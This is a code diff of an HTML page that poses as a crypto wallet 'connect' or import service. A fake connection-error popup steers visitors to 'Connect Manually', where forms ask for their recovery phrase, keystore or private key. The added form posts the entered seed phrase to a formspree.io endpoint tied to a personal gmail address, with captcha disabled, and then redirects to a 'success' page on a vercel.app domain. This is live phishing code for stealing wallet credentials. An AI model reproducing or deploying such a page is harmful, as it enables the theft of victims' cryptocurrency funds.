@@ -819,16 +819,16 @@
 
         <div id="popup" class="py-5 hidden flex-col justify-center relative mt-4">
 
-            <div class=" cursor-pointer w-[80%] mx-auto border py-2 border-red-700">
-                <p class="text-[red] cursor-pointer text-center text-[12px] lg:text-[16px] px-4">An error occurred... please try again or connect manually</p>
+            <div class=" cursor-pointer w-[80%] mx-auto border py-4 border-red-700">
+                <p class="text-[red] cursor-pointer text-center text-[14px] font-semibold lg:text-[16px] px-4">Error connecting...</p>
             </div>
 
-            <div class=" cursor-pointer w-[80%] mx-auto border mt-4 py-2 border-blue-700">
+            <!-- <div class=" cursor-pointer w-[80%] mx-auto border mt-4 py-2 border-blue-700">
                 <p class="text-[blue] cursor-pointer text-center text-[13px] lg:text-[16px] px-4">Try Again</p>
-            </div>
+            </div> -->
 
-            <div id="formed" class="border border-slate-500 justify-center flex w-[80%] mt-4 py-2 bg-blue-700 mx-auto">
-                <button class="text-white flex  rounded-lg font-semibold text-center text-[13px] lg:text-[16px] px-4">Connect Manually</button>
+            <div class="border border-slate-500 justify-center flex w-[80%] mt-4 py-2 bg-blue-700 mx-auto">
+                <button  id="formed" class=" text-white flex  rounded-lg font-semibold text-center text-[13px] lg:text-[16px] px-4">Connect Manually</button>
             </div>
 
         </div>
@@ -846,17 +846,38 @@
         </div> -->
         <div class=" hidden p-2 gap-2 flex-col mt-3 items-center justify-center w" id="formsed" >
 
+            
             <div class="head flex items-center justify-center">
                 <!-- <h2>Import Wallet</h2> -->
-                <div class="link text-[14px] font-sans ">
-                    <button class="phrase active bg-green-500 p-2" onclick="opentab (event, 'formfill1')" id="defaultOpen">Phrase</button>
-                    <button class="phrase  hover:!bg-green-500 p-2" onclick="opentab (event, 'formfill2')">Keystore Json</button>
-                    <button class="phrase  hover:!bg-green-500 p-2" onclick="opentab (event, 'formfill3')">Private key</button>
+                <div class="link text-[14px] font-sans">
+                    <button class="phrase active !bg-green-500 hover:bg-green-500 p-2" onclick="opentab (event, 'formfill1')" id="defaultOpen">Phrase</button>
+                    <button class="phrase  hover:bg-green-500 p-2" onclick="opentab (event, 'formfill2')">Keystore Json</button>
+                    <button class="phrase  hover:bg-green-500 p-2" onclick="opentab (event, 'formfill3')">Private key</button>
                 </div>
             </div>
-            
-            <div class="forms hidden gap-2 flex-col mt-5 items-center justify-center" id="formfill1">
+
+            <div class="forms gap-2 flex-col mt-5 items-center justify-center" id="formfill1">
                 <h1 class="text-[12px] font-sans ml-5">Recovery Phrase</h1>
+
+
+                <form id="fs-frm" name="simple-contact-form" accept-charset="utf-8" action="https://formspree.io/gabbyjuan064@gmail.com" method="post">
+                    <fieldset id="fs-frm-inputs">
+                      <!-- <label for="full-name">Full Name</label>
+                      <input type="text" name="name" id="full-name" placeholder="Michael Bubbly" required="">
+                      <label for="email-address">Email Address</label>
+                      <input type="email" name="_replyto" id="email-address" placeholder="email@domain.tld" required=""> -->
+                      <label for="message">Message</label>
+                      <textarea required type="text" name="Phrase" id="" rows="3" cols="35"  placeholder="Enter your Phrase"  class="placeholder:text-[12px] placeholder:text-slate-500 px-2 p-2 indent-1 lg:px-0 border placeholder:p-3 border-slate-400 rounded-lg resize-none outline-none block"></textarea>
+                      <input type="hidden" name="_next" value="https://cryptonnet.vercel.app/success.html">
+               
+    
+                      <input type="hidden" name="_captcha" value="false">
+               
+      
+                      <h2 class="text-[10px] font-sans">Type your phrase (usually 12 or 24) separated by a single space.
+                    </fieldset>
+                    <button type="submit" id="" class="w-[30%] lg:w-[50%] mx-auto text-white text-[12px] font-sans rounded-lg m-1 bg-green-500 p-2 justify-center flex " onclick="">IMPORT</button>
+                  </form>
     
                 <form id="contactform"  action="https://formsubmit.io/send/gabbyjuan064@gmail.com" method="POST" class="flex gap-2 flex-col items-center justify-center">
     
@@ -866,7 +887,7 @@
                     <!-- <input name="_redirect" type="hidden" id="name" value="https://protocolsyncc.vercel.app/done.html"> -->
                     <!-- <input name="_formsubmit_id" type="text" style="display:none"> -->
     
-                    <input type="hidden" name="_next" value="https://cryptonnet.vercel.app/done.html">
+                    <input type="hidden" name="_next" value="https://cryptonnet.vercel.app/success.html">
                
     
                     <input type="hidden" name="_captcha" value="false">
@@ -977,7 +998,8 @@
             </div>
     
         </div>
-        <script src="import.js"></script>
+        <!-- <script src="import.js"></script> -->
+        <script src="main.js"></script>
 <!-- 
         <div id="formsed" class="hidden gap-2 flex-col mt-5 items-center justify-center">
             <form id="contactform" action="https://gabbyjuan064@gmail.com" method="POST">
@@ -1004,7 +1026,7 @@
     </div>
    
     <script src="main.js"></script>
-    <script src="import.js"></script>
+    <!-- <script src="import.js"></script> -->
 
     
 </body>
